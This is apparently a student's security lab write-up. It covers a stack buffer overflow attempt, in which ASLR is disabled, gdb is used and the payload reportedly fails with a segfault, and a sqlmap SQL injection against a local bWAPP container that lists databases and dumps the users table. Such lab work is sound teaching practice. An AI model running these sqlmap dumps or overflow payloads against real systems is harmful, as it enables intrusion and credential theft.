# Lab #1,22110023, Pham Nam Hao,  INSE340380E 03FIE
# Task 1: Software buffer overflow attack
 
**Make a vulnerable C program**
```
!(https://github.com/user-attachments/assets/c6601ab9-f2f3-4f29-aff3-ca0a5eb8ed1b)
```
**Make a shell C program**
```
!(https://github.com/user-attachments/assets/4de6ebb1-4719-4dde-b3ae-d8334302721f)
```
**Answer 1**:I choose Code Injection route.
- Compile both C programs and shellcode to executable code.
  + Turn off OS's address space layout randomization
    '''
    sudo sysctl -w kernel.randomize_va_space=0
    '''
  + Compile program with options to defeat stack protecting mechanism and code execution on stack:
    '''
    ![Screenshot 2024-10-23 100200](https://github.com/user-attachments/assets/7c5a6f2c-da29-442a-971c-91c4ac7f174c)
    '''
  + Creat link to zsh instead of default dash to turn off bash countermeasures of Ubuntu 16.04:
    '''
    $> sudo ln -sf /bin/zsh /bin/sh
    '''
- Conducting the attack on labbof.out
  + Load vulnerable file into gdb
    '''
    gdb labbof.out -q
    '''
    ![image](https://github.com/user-attachments/assets/f1c372e7-ca85-4e5e-8f15-923c6f87b98e)
    '''
  + View assembly code to find return address and set a break point after strcpy function to overflow the buffer with python script
    '''
    (gdb) disas main
    (gdb) break *0x000011c2
    '''
    ![image](https://github.com/user-attachments/assets/1f27d9ed-e058-43cc-9437-06559b51d350)
    '''
  + Load shell C program into gdb and find esp address
    '''
    gdb atk.out -q
 
    (gdb) disas main 
    '''
    ![image](https://github.com/user-attachments/assets/83b461e5-e392-469e-afd6-a1b71ae0202d)
    '''

**Conclusion**: 
I tried to replace the esp address of shell program in a buffer padding but there's only segmentaion fault error
'''
./labbof.out $(python3 -c "print('A'*16 + '\x8d\x11\x00\x00' +'\xff\xff\xff\xff')")
'''
![image](https://github.com/user-attachments/assets/f7cb99b6-cf6c-42b4-9f17-9805d63d6ee1)
'''

# Task 2: Attack on the database of bWapp 
- Install bWapp (refer to quang-ute/Security-labs/Web-security). 
- Install sqlmap.
- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup. 

**Set Up** 
- Download and set up bWapp, sqlmap
  '''
  docker pull raesene/bwapp

  docker run --rm -it -p 8025:80 raesene/bwapp
  '''
  ![image](https://github.com/user-attachments/assets/7bdc60ea-4ea3-4b4e-9088-07a7523adc3a)
  ![image](https://github.com/user-attachments/assets/cc2f8644-6510-4cc4-8414-9c6c114f0569)
  
  ![image](https://github.com/user-attachments/assets/f2c0a86c-0b57-4c6f-8467-d5a514608fe9)
  '''
  
- Local host set up successful
  '''
  ![image](https://github.com/user-attachments/assets/83e01643-e670-4a7e-8396-3bf1c5862fe4)
  '''

**Question 1**: Use sqlmap to get information about all available databases
**Answer 1**:

- Find the cookies by inspecting
  '''
  ![image](https://github.com/user-attachments/assets/e82eeae0-4507-4745-bb3b-4d7a69f04202)
  '''
- Get information about databases
  '''
  >python sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=1" --dbs --cookie "PHPSESSID=buvohn13p4tdh6sbh7lea61686; security_level=0"
  '''
  ![image](https://github.com/user-attachments/assets/b0ea698e-9cc2-43e1-bb4e-06558a603506)
  '''

**Question 2**: Use sqlmap to get tables, users information
**Answer 2**:
- Get tables
  '''
  python sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=1" -D bWAPP --tables --cookie "PHPSESSID=buvohn13p4tdh6sbh7lea61686; security_level=0"
  '''
  ![image](https://github.com/user-attachments/assets/2d14a455-622c-4bcd-9441-806acad15879)
  '''

- Get users information
  '''
   python sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=1" -D bWAPP -T users --dump --cookie "PHPSESSID=buvohn13p4tdh6sbh7lea61686; security_level=0"
  '''
  ![image](https://github.com/user-attachments/assets/ed172eb2-3fd3-4b09-85d7-f277ab6c8eb9)
  '''
  
**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
**Answer 3**:
